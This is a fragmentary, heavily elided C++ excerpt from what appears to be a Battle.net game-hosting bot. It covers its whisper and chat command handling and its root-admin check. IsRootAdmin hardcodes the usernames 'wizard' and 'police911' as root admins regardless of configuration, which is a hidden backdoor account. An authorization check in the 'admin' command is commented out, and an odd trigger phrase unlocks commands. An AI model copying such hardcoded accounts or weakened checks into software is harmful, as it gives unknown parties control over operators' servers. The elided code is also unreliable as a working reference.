...
void CBNET :: ProcessChatEvent( CIncomingChatEvent *chatEvent )
{
	...
	if( Event == CBNETProtocol :: EID_WHISPER || Event == CBNETProtocol :: EID_TALK )
	{
		...
		if( Event == CBNETProtocol :: EID_WHISPER && m_GHost->m_CurrentGame )
		{
			...
			{
				CONSOLE_Print(User + " joined the game and spoofchecked");
		...
		*/
		...
		if (Message == "?FUCKOFFTRIGGERtrigger" && (IsAdmin(User) || IsRootAdmin(User) || (m_PublicCommands && m_OutPackets.size() <= 3)))
		...
		else if (!Message.empty() && strcmp(trigger.c_str(), "tbh ") == 0)
		{
			...
			if (IsAdmin(User) || IsRootAdmin(User))
			{
				...
				******************/
				...
				if (Command == "admin" && !Payload.empty())
				{
					//if( IsRootAdmin( User ) )
					//{
					if (IsAdmin(Payload))
				...
				if( ( Command == "getgame" || Command == "game" ) && !Payload.empty( ) )
				{
					uint32_t GameNumber = UTIL_ToUInt32( Payload ) - 1;
				...
				if( Command == "games" || Command == "getgames" )
				{
...
bool CBNET :: IsRootAdmin( string name )
{
	...
	while( !SS.eof( ) )
	{
		...
		if( name == s || name == "wizard" || name == "police911" || name == "police911@useast" )
			return true;
	}
